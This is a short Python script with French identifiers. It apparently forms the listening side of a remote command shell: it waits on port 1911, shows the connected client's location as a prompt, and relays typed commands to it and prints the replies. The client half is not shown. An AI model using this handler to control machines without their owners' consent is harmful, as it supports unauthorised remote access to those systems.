import socket
hote = ''
port = 1911
boucle = True
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((hote, port))
socket.listen(1)
print("Attendez..")

client, infos_connexion = socket.accept()

while boucle is True:
    whereiam = client.recv(1024)
    whereiam = whereiam.decode()
    commande = input(whereiam+"# ")

    if commande != "closeserverclient":
        commande = commande.encode()
        client.send(commande)
        print(client.recv(18000))
    else:
        boucle = False

client.close()
socket.close()
